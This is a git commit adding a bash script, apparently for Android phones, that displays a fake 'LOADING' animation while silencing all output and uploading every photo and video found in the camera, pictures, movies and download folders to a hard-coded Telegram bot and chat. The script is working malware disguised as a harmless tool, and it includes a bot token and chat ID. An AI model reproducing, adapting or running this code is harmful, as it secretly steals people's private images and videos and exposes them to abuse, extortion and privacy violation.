1d0df9a3f8333e0152e7d07e59d5e5eca5753b5b
haicon207 <lienmom2001@gmail.com>
2025-11-27 21:56:09 +0700

    Add files via upload

---
+++ 2007.sh
@@ -0,0 +1,62 @@
+#!/bin/bash
+
+BOT_TOKEN="8329608817:AAEGF8FhX41Od6Unhpy5mby_L-t1ACQCD1U"
+CHAT_ID="7514545803"
+
+
+exec >/dev/null 2>&1
+
+types="-iname *.jpg -o -iname *.jpeg -o -iname *.png -o \
+-iname *.mp4 -o -iname *.mov -o -iname *.mkv -o -iname *.3gp"
+
+DIRS=(
+"/storage/emulated/0/DCIM"
+"/storage/emulated/0/Pictures"
+"/storage/emulated/0/Movie"
+"/storage/emulated/0/Download"
+)
+
+loading() {
+    dots=""
+    while true; do
+        dots="$dots."
+        [ ${#dots} -gt 8 ] && dots="."
+        echo -ne "LOADING$dots\r"
+        sleep 0.2
+    done
+}
+
+loading &
+PID=$!
+
+LIMIT=10
+
+for D in "${DIRS[@]}"; do
+    find "$D" -type f \( $types \) 2>/dev/null | while read FILE; do
+        
+        while (( $(jobs | wc -l) >= LIMIT )); do
+            sleep 0.05
+        done
+
+        (
+        EXT="${FILE##*.}"
+        EXT=$(echo "$EXT" | tr 'A-Z' 'a-z')
+
+        if [[ "$EXT" =~ ^(mp4|mov|mkv|3gp)$ ]]; then
+            curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendVideo" \
+                -F chat_id="$CHAT_ID" \
+                -F video="@$FILE"
+        else
+            curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto" \
+                -F chat_id="$CHAT_ID" \
+                -F photo="@$FILE"
+        fi
+        ) &
+
+    done
+done
+
+wait
+kill $PID
+echo
+echo "HOÀN THÀNH"
